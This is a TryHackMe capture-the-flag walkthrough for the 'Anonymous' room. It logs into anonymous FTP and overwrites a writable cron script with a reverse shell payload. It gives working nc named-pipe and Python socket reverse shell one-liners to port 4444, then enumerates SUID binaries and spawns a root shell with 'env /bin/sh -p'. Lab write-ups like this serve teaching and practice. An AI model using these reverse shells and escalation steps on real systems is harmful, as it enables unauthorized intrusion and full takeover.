# 🔥 TryHackMe Anonymous – Privilege Escalation via Writable Cron Script and SUID Binaries

---

## 📌 Scenario Summary

- Target runs **FTP with anonymous login allowed**.
- FTP directory contains:
  - A cleanup script (`clean.sh` or similar) running as a **cron job**.
  - A log file that updates regularly, indicating the cron is active.
- **Writable cron script** allows injecting a reverse shell payload.
- You get a low-privilege shell via FTP exploit and then escalate.
- Found SUID binaries on the system (common escalation vectors).
- Final root access achieved.

---

## 1. Initial Access: FTP & Cron Job

### Step 1: Connect to FTP as anonymous

```bash
ftp <TARGET_IP>
Username: anonymous
Password: (just press Enter)
Step 2: Enumerate files
Found three files:

A .txt file (not useful)

A clean.sh script (used for cleanup)

A clean.log file (updated regularly)

Step 3: Understand cron job
The clean.sh is running as a cron job, meaning it executes automatically on schedule.

This gives an opportunity to inject code that will run with cron's privileges.

Step 4: Download all files locally
bash
Copy
Edit
mget *
Step 5: Modify clean.sh to include reverse shell
Since cron runs shell scripts, use a bash-compatible reverse shell (Python may not work if Python isn't available in cron's environment):

Example reverse shell (bash):

bash
Copy
Edit
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.17.7.111 4444 > /tmp/f
Or python reverse shell:

bash
Copy
Edit
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"]);'
Step 6: Upload modified clean.sh back to FTP
Ensure you are in the directory where the cron script resides.

Upload the new clean.sh:

bash
Copy
Edit
put clean.sh
Step 7: Open a netcat listener on your machine
bash
Copy
Edit
rlwrap nc -lvnp 4444
Step 8: Wait for cron to execute and trigger reverse shell connection
2. Post-Exploitation: Enumerate SUID Binaries
Once you have shell access (may be low privilege), find potential privilege escalation vectors:

bash
Copy
Edit
find / -type f -perm -4000 -ls 2>/dev/null
This lists files with the SUID bit set.

3. Escalate Privileges
Check SUID binaries found, some common ones are:

swift
Copy
Edit
/bin/su
/bin/ping
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
If any are misconfigured or can be exploited, use them to escalate.

4. Gain Root Shell
Example:

bash
Copy
Edit
/usr/bin/env /bin/sh -p
Verify root access:

bash
Copy
Edit
whoami
# Output: root
Summary
Step	Command / Action	Notes
FTP Login	ftp <IP> (anonymous)	Access files
Download Files	mget *	Get cron scripts
Modify Script	Inject reverse shell in clean.sh	Use bash reverse shell script
Upload Script	put clean.sh	Replace cron job script
Netcat Listener	rlwrap nc -lvnp 4444	Wait for shell
Enumerate SUID Files	find / -type f -perm -4000 -ls 2>/dev/null	Find escalation opportunities
Exploit SUID or Env	/usr/bin/env /bin/sh -p	Spawn root shell
Check Root	whoami	Confirm root privileges

Note: Always validate the environment, cron timing, and permissions before executing.